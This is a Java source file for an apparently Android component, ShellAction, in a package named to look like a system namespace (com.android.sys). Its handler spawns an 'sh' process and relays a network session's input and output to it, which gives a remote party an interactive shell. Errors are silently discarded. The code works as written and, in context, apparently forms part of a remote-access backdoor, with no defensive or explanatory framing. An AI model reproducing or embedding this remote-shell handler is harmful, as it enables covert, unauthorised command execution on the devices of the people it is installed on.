package com.android.sys.action;

import com.android.sys.session.NetworkSessionManager;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

public class ShellAction implements NetworkSessionManager.ActionHandler {
    private final static String SHELL_NAME = "sh";
    private final static int BUFF_LEN = 0X1000;
    @Override
    public void handleAction(String actionName, final InputStream inputStream, final OutputStream outputStream) {
        Process process = null;
        try {
            ProcessBuilder processBuilder = new ProcessBuilder(SHELL_NAME);
            processBuilder.redirectErrorStream(true);
            process = processBuilder.start();
            final InputStream shellInputStream = process.getInputStream();
            final OutputStream shellOutputStream = process.getOutputStream();

            //push shell process output to outputStream
            new Thread(new Runnable() {
                @Override
                public void run() {
                    byte[] buffer = new byte[BUFF_LEN];
                    int len = 0;
                    try {
                        while ( ( len = shellInputStream.read(buffer) ) > 0) {
                            outputStream.write(buffer, 0, len);
                            outputStream.flush();
                        }
                    } catch (IOException e) {
                    } finally {
                        try {
                            outputStream.close();
                        } catch (IOException e1) {
                        }
                        try {
                            inputStream.close();
                        } catch (IOException e1) {
                        }
                    }
                }
            }).start();

            //push inputStream data to shell process
            byte[] buffer = new byte[BUFF_LEN];
            int len = 0;
            while ( ( len = inputStream.read(buffer) ) > 0) {
                shellOutputStream.write(buffer, 0, len);
                shellOutputStream.flush();
            }
        } catch (IOException e) {
        } finally {
            if(process != null) {
                process.destroy();
            }
        }
    }
}
